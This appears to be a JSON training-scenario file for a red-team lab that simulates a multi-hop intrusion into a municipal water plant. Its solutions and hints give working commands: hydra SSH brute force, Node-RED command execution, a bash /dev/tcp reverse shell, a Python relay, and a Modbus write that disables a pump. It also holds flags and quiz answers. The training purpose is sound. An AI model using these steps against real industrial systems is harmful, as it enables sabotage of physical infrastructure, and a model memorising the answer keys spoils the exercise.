@@ -1,0 +1,493 @@
+{
+  "title": "Operation Waterborne: Industrial Control Hijack and Pivoting",
+  "description": "An immersive security exercise mimicking state-sponsored threat actors. You are tasked with assessing the security posture of the 'Resolute' Municipal Water Plant by simulating a multi-hop breach: scanning the operations subnet, compromising an exposed HMI, extracting operator credentials, pivoting laterally to the Engineering Workstation, and sabotaging a critical pump via raw Modbus TCP command injection.",
+  "prerequisites": [
+    "Familiarity with basic Linux command-line operations (ls, cat, cd, ssh)",
+    "Fundamental knowledge of TCP/IP networking, subnets, and ports",
+    "Basic experience running network scanning tools (like nmap)",
+    "Concept of remote reverse shell execution and netcat listeners",
+    "Familiarity with the Purdue Model structure for industrial networks"
+  ],
+  "outcomes": [
+    "Industrial network scanning and reconnaissance using nmap",
+    "Exploiting unauthenticated graphical control portals (Node-RED)",
+    "Harvesting credentials and upgrading standard shells to interactive pseudo-terminals (PTY)",
+    "Pivoting laterally between secure network zones (Purdue Model Levels 3, 2, and 1)",
+    "Conducting protocol injection attacks using raw Modbus TCP to manipulate PLC register states"
+  ],
+  "state": "RELEASED",
+  "show_stepper_bar": true,
+  "estimated_duration": 72,
+  "variant_sandboxes": false,
+  "levels": [
+    {
+      "title": "Overview",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "# Operation Waterborne: Industrial Control Hijack and Pivoting\n\nWelcome to the training scenario. This sandbox simulates a multi-hop intrusion chain against a municipal water plant, structured in accordance with the Purdue Enterprise Reference Architecture (PERA), which is adopted by the ISA/IEC 62443 standard for network zone segmentation.\n\n### Purdue Model & IDMZ Alignment in the Sandbox\n\n| Level | Sandbox Host | Role | Network Zone | Purdue Model Level |\n|:---:|---|---|---|---|\n| **Foothold** | `attacker-host` | Attacker Workstation | Corporate Network | Level 4/5 (Enterprise) |\n| **IDMZ** | `dmz-jump` | Industrial Jump Host | Industrial DMZ (IDMZ) | Level 3.5 (DMZ) |\n| **Operations** | `scada-hmi` | SCADA Flow Editor (Node-RED) | Operations Subnet | Level 2 (Area Control) |\n| **Engineering** | `engineering-station` | Engineering Workstation (EWS) | Control Network | Level 3 (Operations) |\n| **Process Control** | `openplc-node` | Software PLC (OpenPLC) | Control Network | Level 1 (Direct Control) |\n\n### Training Path Outline\n\n1.  **Overview / Info:** You are here.\n2.  **Foothold (Access):** Log in to the Kali console (`attacker-host`).\n3.  **IDMZ Access (Training):** Discover and log in to the Level 3.5 Jump Host (`dmz-jump`).\n4.  **Reconnaissance (Training):** Scan the operations network *from the DMZ* to discover the SCADA HMI web port.\n5.  **Exploitation (Training):** Forward ports via SSH and compromise HMI via unauthenticated Node-RED (RCE).\n6.  **Credential Access (Training):** Extract operator passwords from local file backups.\n7.  **Pivot (Training):** Spawning a shell, upgrading to interactive TTY, and SSH pivoting into the Engineering Workstation.\n8.  **Sabotage (Training):** Sending cleartext Modbus TCP instructions to disable a cooling pump process register.\n9.  **Knowledge Assessment (Test):** Verification questions covering ports, protocols, and taxonomies.\n10. **Feedback (Questionnaire):** Evaluation and feedback survey.\n"
+    },
+    {
+      "title": "FOOTHOLD: Access the Attacker Console",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 2,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "### Scenario Overview\n\nYou are a senior red-team operator hired to conduct an authorized adversarial assessment against the Resolute Water Treatment Facility. The plant uses segregated networks based on the Purdue Model (adapted under the ISA/IEC 62443 zoning standard), but you have gained an initial foothold inside the corporate management network.\n\n### Your Objective\n\nAccess the **`attacker-host`** (your Kali Linux terminal) login credentials: kali, kali, open the console, and input the passkey **`start`** to initialize the operation.",
+      "local_content": "Input the passkey **`start`** to unlock the first stage of Operation Waterborne."
+    },
+    {
+      "title": "IDMZ: Access the Industrial DMZ Jump Host",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 1,
+      "answer": "FLAG{IDMZ_JUMP_ACCESSED}",
+      "content": "### The Situation\n\nYour initial reconnaissance indicates that direct routing from your corporate Kali host to the SCADA operations network (`192.168.100.0/24`) is blocked by the perimeter gateway firewall. This enforces standard IEC 62443 zone architectures, which forbid direct corporate-to-operations paths.\n\nHowever, a Level 3.5 Industrial DMZ (IDMZ) is configured with an exposed jump host in the `192.168.50.0/24` subnet for remote engineering access.\n\n### Your Objective\n\n1. Scan the IDMZ subnet (`192.168.50.0/24`) using `nmap` from your Kali host to locate the active jump host.\n2. You don't have any credentials, but you know that the user **`operator`** has a weak password. You must guess it using a dictionary attack. A common passwords list (`passlist.txt`) is placed in your home directory for your convenience.\n3. Leverage a password attack tool (like `hydra`) to find the SSH password of the `operator` user on the jump host.\n4. Connect via SSH to the discovered jump host using the cracked credentials.\n5. Read the flag file located at `/home/operator/flag.txt` to complete this level.\n",
+      "solution": "1. Run a port scan from the Kali console: `nmap -p 22 --open 192.168.50.0/24` to locate the jump host at `192.168.50.50`.\n2. Perform a dictionary attack on the SSH service using Hydra: `hydra -l operator -P passlist.txt ssh://192.168.50.50` (reveals password `operator123`).\n3. Log in to the jump host: `ssh operator@192.168.50.50` (using password `operator123`).\n4. Print the flag: `cat flag.txt` to retrieve `FLAG{IDMZ_JUMP_ACCESSED}`.",
+      "max_score": 100,
+      "hints": [
+        {
+          "title": "DMZ Host Discovery",
+          "content": "Use `nmap -p 22 --open 192.168.50.0/24` to locate the SSH endpoint in the DMZ subnet.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Tool for password attacks",
+          "content": "Common tools for password attacks are **hydra** and **medusa**. Run `hydra -l operator -P passlist.txt ssh://192.168.50.50` to test the password dictionary against the operator user. Use `ls` to list files in your home directory.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0008.T1021.004"
+        },
+        {
+          "technique_key": "TA0006.T1110"
+        }
+      ],
+      "expected_commands": [
+        "nmap.*192.168.50.*",
+        "hydra.*",
+        "ssh operator@192.168.50.50",
+        "cat flag.txt"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "RECONNAISSANCE: SCADA HMI Discovery",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 5,
+      "answer": "192.168.100.10:1880",
+      "content": "### The Situation\n\nYou have logged into the `dmz-jump` host. Your current session provides routing to the operations management network subnet: `192.168.100.0/24`, which is otherwise blocked from corporate IT hosts. Before launching any exploits, you must locate the active SCADA HMI web portal.\n\n### Your Objective\n\n1. From the `dmz-jump` shell, scan the operations subnet (`192.168.100.0/24`) using `nmap` to locate the active HMI host.\n2. Identify the IP address and port running the SCADA flow editor (hint: look for Node-RED's default port).\n\nWhat is the IP address and port of the SCADA flow editor? (Format: `IP:PORT`, e.g. `192.168.1.100:80`)",
+      "solution": "1. Run a port scan from the dmz-jump host: `nmap -p 1880 --open 192.168.100.0/24`\n2. Note the active host on port 1880: `192.168.100.10:1880` and submit it as the answer.",
+      "max_score": 50,
+      "hints": [
+        {
+          "title": "Scanning from the Jump Host",
+          "content": "Run `nmap -p 1880 --open 192.168.100.0/24` directly on the `dmz-jump` terminal.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "SCADA Web Port Target",
+          "content": "Industrial flow portals like Node-RED run on the default port `1880`.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0007.T1046"
+        }
+      ],
+      "expected_commands": [
+        "nmap.*192.168.100.*",
+        "nmap.*-p 1880.*"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "EXPLOITATION: SCADA HMI Compromise (Florida Oldsmar Incident)",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 10,
+      "answer": "FLAG{SCADA_HMI_COMPROMISED}",
+      "content": "### The Situation\n\nDirect network routing to the SCADA HMI (discovered in the previous level) is blocked from the corporate network, but permitted from the DMZ jump host. To access the graphical Node-RED editor inside your Kali browser, you must set up an SSH local port forward tunnel through the jump host.\n\n### Your Objective\n\n1. Establish an SSH local port forward to access the SCADA HMI host.\n2. Open your Kali web browser and navigate to `http://localhost:1880/`.\n3. Leverage the graphical workspace to run system-level commands as `root` (RCE) on the HMI. Read the flag located at `/root/flag.txt`.",
+      "solution": "1. Establish local port forward: `ssh -L 1880:192.168.100.10:1880 operator@192.168.50.50`\n2. Open http://localhost:1880/ in browser.\n3. Drag Inject -> Exec -> Debug nodes onto the canvas and wire them.\n4. Set Exec node command: `cat /root/flag.txt`\n5. Deploy and inject. Read the flag `FLAG{SCADA_HMI_COMPROMISED}` in the debug tab.",
+      "max_score": 50,
+      "hints": [
+        {
+          "title": "SSH Port Forwarding",
+          "content": "Run `ssh -L 1880:192.168.100.10:1880 operator@192.168.50.50` on your Kali machine to map the remote HMI port to your local localhost:1880.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Node-RED Command execution",
+          "content": "Double click the Exec node in Node-RED and input the command: `cat /root/flag.txt`.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0001.T1190"
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+     {
+      "title": "CREDENTIAL ACCESS: Operator Secrets",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 5,
+      "answer": "EngineeringPass2026!",
+      "content": "### The Situation\n\nYou have compromised the SCADA HMI web portal, but direct access to the PLC control network remains blocked. To pivot further, you need credentials for the Engineering Workstation (EWS).\n\n### Your Objective\n\n1. Explore the file system of the compromised SCADA HMI.\n2. Look inside operator home directories for configuration parameters or leaked credentials.\n3. Find the engineer password stored in the credentials file.\n\nWhat is the password of the engineer user?",
+      "solution": "Use the Node-RED exec node to run: `cat /home/debian/ews_credentials.txt`. Copy the password value: `EngineeringPass2026!`.",
+      "max_score": 50,
+      "hints": [
+        {
+          "title": "Finding Engineer Credentials",
+          "content": "Plant engineers frequently save backup configurations or notes in operator home directories. Use the shell executor to list the contents of the `/home/debian/` directory to check for any credentials files.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Exact Credential File Path",
+          "content": "Read the content of the credentials backup file: `cat /home/debian/ews_credentials.txt` to extract the engineer password.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0006.T1552.001"
+        }
+      ],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "PIVOT: Engineering Workstation Lateral Movement (Ukraine Power Grid)",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 15,
+      "answer": "192.168.20.10",
+      "content": "### The Situation\n\nYou now hold credentials for the Engineering Workstation (EWS), which has administrative access to the PLC network. This step mimics the **2015 Ukraine Power Grid cyberattack**, where attackers pivoted from the compromised corporate subnets to the high-privilege EWS nodes to control remote substations.\n\nDirect access to the control subnet (`192.168.20.0/24`) is blocked from Kali, but is permitted from the SCADA HMI.\n\n### Your Objective\n\n1. Establish an interactive terminal connection to the EWS using the IP and stolen credentials you harvested in the previous level.\n2. Scan the internal control subnet (`192.168.20.0/24`) to identify the IP address of the active PLC.\n\nWhat is the IP address of the PLC?",
+      "solution": "Method A (Direct Netcat Listener on dmz-jump):\n1. SSH to dmz-jump (192.168.50.50) from Kali and start a listener: nc -nlvp 4444\n2. Configure a Node-RED exec node command with the reverse shell targeting dmz-jump: bash -c 'bash -i >& /dev/tcp/192.168.50.50/4444 0>&1' and trigger it.\n3. On the caught shell on dmz-jump, upgrade the PTY: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n4. SSH into EWS: ssh engineer@192.168.20.20 (use password EngineeringPass2026!)\n5. Find the active PLC by running: nmap -sn 192.168.20.0/24 to identify 192.168.20.10.\n\nMethod B (Python TCP Relay to Kali):\n1. Start nc -nlvp 4444 on Kali.\n2. SSH to dmz-jump and run the Python relay: python3 -c 'import socket, _thread; s=socket.socket(); s.bind((\"0.0.0.0\",4444)); s.listen(1); c,_=s.accept(); k=socket.socket(); k.connect((\"10.10.10.50\",4444)); _thread.start_new_thread(lambda: [k.sendall(d) for d in iter(lambda: c.recv(4096), b\"\")], ()); [c.sendall(d) for d in iter(lambda: k.recv(4096), b\"\")]'\n3. Trigger the reverse shell in Node-RED targeting 192.168.50.50:4444 to relay directly back to Kali.",
+      "max_score": 50,
+      "hints": [
+        {
+          "title": "SSH Credential Recall",
+          "content": "The engineer credentials extracted from the HMI are: User: `engineer`, Password: `EngineeringPass2026!`.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Interactive Pivot via PTY Upgrade (Crucial)",
+          "content": "A raw Node-RED shell cannot handle interactive SSH password prompts. You must catch a full terminal session on the DMZ jump host or relay it to Kali:\n\nMethod A (Direct nc on DMZ):\n1. SSH to dmz-jump (`192.168.50.50`) and start a listener: `nc -nlvp 4444`.\n2. Deploy a Node-RED exec node containing: `bash -c 'bash -i >& /dev/tcp/192.168.50.50/4444 0>&1'` and trigger it.\n3. Upgrade to PTY on dmz-jump: `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` and SSH into EWS (`ssh engineer@192.168.20.20`).\n\nMethod B (Python Relay to Kali):\n1. Start `nc -nlvp 4444` on Kali.\n2. SSH to dmz-jump (`192.168.50.50`) and run: `python3 -c 'import socket, _thread; s=socket.socket(); s.bind((\"0.0.0.0\",4444)); s.listen(1); c,_=s.accept(); k=socket.socket(); k.connect((\"10.10.10.50\",4444)); _thread.start_new_thread(lambda: [k.sendall(d) for d in iter(lambda: c.recv(4096), b\"\")], ()); [c.sendall(d) for d in iter(lambda: k.recv(4096), b\"\")]'`.\n3. Deploy the Node-RED exec node targeting `192.168.50.50:4444` to relay the shell straight to your Kali terminal.",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "OT Device Fingerprinting (textbook nmap vs. passive sniffing)",
+          "content": "A simple ping scan (`nmap -sn 192.168.20.0/24`) reveals live hosts, but to identify the PLC specifically, use OT-focused techniques:\n- **Targeted Port Scan:** Scan for standard Modbus TCP (port 502): `nmap -p 502 --open 192.168.20.0/24`.\n- **Modbus Discovery:** Extract device manufacturer details using the Nmap Scripting Engine: `nmap -p 502 --script modbus-discover 192.168.20.0/24`.\n- **Passive Sniffing (Quiet Approach):** Sniff existing control traffic to locate the active controller without sending active probes: `sudo tcpdump -i eth0 -n port 502`.",
+          "hint_penalty": 20,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0008.T1021.004"
+        },
+        {
+          "technique_key": "TA0007.T1046"
+        }
+      ],
+      "expected_commands": [
+        "nc -nlvp.*",
+        "python3 -c.*pty\\.spawn.*",
+        "ssh engineer@192\\.168\\.20\\.20",
+        "nmap.*192\\.168\\.20\\..*"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "SABOTAGE: Modbus Protocol Injection (Industroyer / Stuxnet)",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 15,
+      "answer": "FLAG{PUMP_DISABLED_SUCCESS}",
+      "content": "### The Situation\n\nYou have gained access to the Engineering Workstation and identified the target PLC. The controller manages a cooling loop pump mapped to Modbus Holding Register 0 (PLC Address 40001). Currently, the register is set to `1` (normal operational loop).\n\nLike **Stuxnet (2010)** or **Industroyer (2016)**, you will inject raw industrial protocol commands to directly manipulate physical process registers.\n\n### Your Objective\n\n1. From the EWS terminal, write the sabotage value `0` to Holding Register 0 to force the cooling pump to turn off.\n2. The safety monitoring sidecar running on the EWS will detect the unauthorized register overwrite and record the validation flag in the safety log.\n3. Retrieve the flag from the EWS log directory to complete the assessment.",
+      "solution": "1. Run the Modbus write command: modbus 192.168.20.10 0=0\n2. Read the safety override flag file: cat /var/log/safety_override.txt",
+      "max_score": 100,
+      "hints": [
+        {
+          "title": "Modbus CLI Tool Concept",
+          "content": "The pre-installed `modbus` CLI utility lets you execute Modbus commands simply: `modbus <PLC_IP> <Register_Address>=<Value>`. Note that holding registers are zero-indexed, and we are targeting register 0.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Locating the Safety Log File",
+          "content": "The safety monitor sidecar writes the flag file to the EWS system log directory (`/var/log/`). Look for a text file referencing 'safety' or 'override' in that folder.",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "Exact Sabotage Commands",
+          "content": "1. Write zero to register 0: `modbus 192.168.20.10 0=0`\n2. Read the validation flag: `cat /var/log/safety_override.txt`\n\n*Alternative Python Script:* \n```python\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('192.168.20.10')\nc.connect()\nc.write_register(0, 0)\nc.close()\n```",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0105.T0855"
+        },
+        {
+          "technique_key": "TA0105.T0831"
+        }
+      ],
+      "expected_commands": [
+        "modbus.*192\\.168\\.20\\.10.*",
+        "cat.*/var/log/safety_override.*"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "Knowledge Assessment",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 8,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "What is the default port number used by the cleartext Modbus TCP protocol?",
+          "points": 100,
+          "penalty": 20,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "22",
+              "correct": false,
+              "order": 0
+            },
+            {
+              "text": "80",
+              "correct": false,
+              "order": 1
+            },
+            {
+              "text": "502",
+              "correct": true,
+              "order": 2
+            },
+            {
+              "text": "1880",
+              "correct": false,
+              "order": 3
+            }
+          ]
+        },
+        {
+          "question_type": "EMI",
+          "text": "Match each sandbox host with its corresponding level in the Purdue Enterprise Reference Architecture (PERA) model.",
+          "points": 100,
+          "penalty": 20,
+          "order": 1,
+          "answer_required": true,
+          "extended_matching_options": [
+            {
+              "text": "Purdue Level 1 (Direct Process Control)",
+              "order": 0
+            },
+            {
+              "text": "Purdue Level 2 (Area/Cell Control)",
+              "order": 1
+            },
+            {
+              "text": "Purdue Level 3 (Operations Management & SCADA)",
+              "order": 2
+            },
+            {
+              "text": "Industrial DMZ - Level 3.5 (Zoning Boundary)",
+              "order": 3
+            }
+          ],
+          "extended_matching_statements": [
+            {
+              "text": "openplc-node (OpenPLC Modbus server)",
+              "order": 0,
+              "correct_option_order": 0
+            },
+            {
+              "text": "engineering-station (EWS configuration station)",
+              "order": 1,
+              "correct_option_order": 2
+            },
+            {
+              "text": "scada-hmi (Node-RED web interface)",
+              "order": 2,
+              "correct_option_order": 1
+            },
+            {
+              "text": "dmz-jump (Debian SSH jump host)",
+              "order": 3,
+              "correct_option_order": 3
+            }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Which Modbus function code is used to perform a single register write to override the pump state?",
+          "points": 100,
+          "penalty": 20,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "0x01 (Read Coils)",
+              "correct": false,
+              "order": 0
+            },
+            {
+              "text": "0x03 (Read Holding Registers)",
+              "correct": false,
+              "order": 1
+            },
+            {
+              "text": "0x05 (Write Single Coil)",
+              "correct": false,
+              "order": 2
+            },
+            {
+              "text": "0x06 (Write Single Register)",
+              "correct": true,
+              "order": 3
+            }
+          ]
+        }
+      ],
+      "instructions": "Test your understanding of the OT network taxonomy, protocols, and architectural models used during this exercise.",
+      "assessment_type": "TEST"
+    },
+    {
+      "title": "Feedback & Evaluation",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 9,
+      "estimated_duration": 5,
+      "minimal_possible_solve_time": null,
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "How engaging was the multi-stage pivot and Modbus hijacking scenario?",
+          "points": 0,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "Highly engaging",
+              "correct": false,
+              "order": 0
+            },
+            {
+              "text": "Moderately engaging",
+              "correct": false,
+              "order": 1
+            },
+            {
+              "text": "Not engaging",
+              "correct": false,
+              "order": 2
+            }
+          ]
+        },
+        {
+          "question_type": "EMI",
+          "text": "Rate your agreement with the following statements regarding sandbox performance and realism:",
+          "points": 0,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "extended_matching_options": [
+            {
+              "text": "Strongly Agree",
+              "order": 0
+            },
+            {
+              "text": "Agree",
+              "order": 1
+            },
+            {
+              "text": "Disagree",
+              "order": 2
+            },
+            {
+              "text": "Strongly Disagree",
+              "order": 3
+            }
+          ],
+          "extended_matching_statements": [
+            {
+              "text": "The interactive reverse shell and PTY upgrade steps felt realistic.",
+              "order": 0
+            },
+            {
+              "text": "The OpenStack/Kubernetes response speed was adequate.",
+              "order": 1
+            },
+            {
+              "text": "The Modbus CLI tool is easy to use.",
+              "order": 2
+            }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What improvements or physical devices would you like to see integrated in future versions of this training sandbox?",
+          "points": 0,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": false
+        }
+      ],
+      "instructions": "Please share your feedback to help us refine the training experience and mechanical design.",
+      "assessment_type": "QUESTIONNAIRE"
+    }
+  ]
+}
